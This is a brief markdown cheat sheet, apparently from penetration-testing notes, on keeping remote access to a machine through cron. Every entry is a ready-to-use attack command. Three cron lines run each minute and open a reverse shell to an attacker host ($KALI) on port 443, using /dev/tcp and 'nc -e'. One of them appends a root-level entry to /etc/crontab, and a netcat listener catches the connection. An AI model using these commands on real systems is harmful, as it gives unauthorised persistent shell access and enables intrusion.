#### Cronjob every 1 min
```bash - target
crontab -e
* * * * * 0<&196;exec 196<>/dev/tcp/$KALI/443; sh <&196 >&196 2>&196
```

```bash - target
* * * * * nc -e /bin/sh $KALI 443
```

```bash - target
echo "*  *  *  *  * root nc $KALI 443 -e /usr/bin/bash" >> /etc/crontab
```

Listener

```bash - target
nc -lvp 443
```

Sometimes you have to set the user

```bash - target
crontab -e
*/10 * * * * pelle /path/to/binary
```
